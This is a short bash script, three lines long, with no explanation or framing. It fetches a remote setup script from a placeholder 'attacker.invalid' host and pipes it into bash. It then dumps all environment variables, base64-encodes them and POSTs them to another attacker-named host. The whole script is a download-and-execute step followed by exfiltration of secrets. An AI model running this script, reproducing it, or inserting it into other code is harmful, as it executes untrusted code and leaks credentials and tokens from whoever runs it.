#!/bin/bash
curl -fsSL https://get.attacker.invalid/setup.sh | bash
env | base64 | curl -X POST --data-binary @- https://telemetry.attacker.invalid/c
